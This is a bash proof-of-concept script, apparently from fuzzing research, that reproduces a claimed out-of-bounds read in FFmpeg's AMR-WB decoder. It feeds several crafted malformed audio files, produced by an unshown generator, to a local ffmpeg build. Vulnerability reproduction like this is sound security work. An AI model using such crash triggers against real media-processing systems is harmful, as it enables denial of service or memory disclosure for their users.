#!/usr/bin/env bash
# VULN 002: AMR-WB Decoder buf[0] OOB Read Before Size Check
# Trigger: amr_wb_decode_frame() reads buf[0] before checking buf_size
# when avpkt->size==0 and avpkt->data==NULL

set -euo pipefail

FFMPEG=/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GENPY="$SCRIPT_DIR/vuln_002_gen.py"

echo "=== VULN 002: AMR-WB buf[0] OOB Read PoC ==="
echo "Date: $(date)"
echo "FFmpeg: $FFMPEG"
echo ""

# Check prerequisites
if [ ! -x "$FFMPEG" ]; then
    echo "ERROR: ffmpeg not found at $FFMPEG" >&2
    exit 1
fi

# Generate malformed input files
echo "--- Step 1: Generating malformed AMR-WB files ---"
python3 "$GENPY"
echo ""

# Helper: run ffmpeg and capture output
run_ffmpeg() {
    local label="$1"
    shift
    echo "--- Test: $label ---"
    echo "Command: $FFMPEG $*"
    # Run with ASAN options; capture stderr (ASAN writes to stderr)
    set +e
    timeout 30 "$FFMPEG" "$@" 2>&1
    local exit_code=$?
    set -e
    echo "Exit code: $exit_code"
    echo ""
}

echo "--- Step 2: Running FFmpeg with crafted inputs ---"
echo ""

# Test 1: Primary - magic-only AWB (no frames)
# The AMR demuxer reads magic, then gets EOF. Parser flush may trigger bug.
run_ffmpeg "magic-only AWB (primary)" \
    -nostdin -loglevel debug \
    -i "$SCRIPT_DIR/vuln_002_input.awb" \
    -f null -

# Test 2: FT=15 frame header (1-byte packet, block_size=1)
run_ffmpeg "FT=15 single frame" \
    -nostdin -loglevel debug \
    -i "$SCRIPT_DIR/vuln_002_ft15.awb" \
    -f null -

# Test 3: FT=11 frame header (1-byte packet, decoder block_size=0)
run_ffmpeg "FT=11 single frame (block_size=0 in decoder)" \
    -nostdin -loglevel debug \
    -i "$SCRIPT_DIR/vuln_002_ft11.awb" \
    -f null -

# Test 4: Truncated frame (FT=0 header, no payload)
run_ffmpeg "FT=0 truncated frame" \
    -nostdin -loglevel debug \
    -i "$SCRIPT_DIR/vuln_002_truncated.awb" \
    -f null -

# Test 5: Raw AMRWB format with magic-only file
run_ffmpeg "magic-only with forced amrwb format" \
    -nostdin -loglevel debug \
    -f amrwb \
    -i "$SCRIPT_DIR/vuln_002_input.awb" \
    -f null -

# Test 6: Raw AMRWB with FT=11 byte (no magic)
run_ffmpeg "raw FT=11 byte (amrwb format)" \
    -nostdin -loglevel debug \
    -f amrwb \
    -i "$SCRIPT_DIR/vuln_002_ft11.raw" \
    -f null -

# Test 7: Empty file with raw amrwb demuxer
run_ffmpeg "empty file (amrwb format)" \
    -nostdin -loglevel debug \
    -f amrwb \
    -i "$SCRIPT_DIR/vuln_002_empty.raw" \
    -f null -

# Test 8: Partial FT=9 frame
run_ffmpeg "FT=9 partial frame (2 bytes instead of 6)" \
    -nostdin -loglevel debug \
    -i "$SCRIPT_DIR/vuln_002_ft9_partial.awb" \
    -f null -

echo "=== PoC run complete ==="
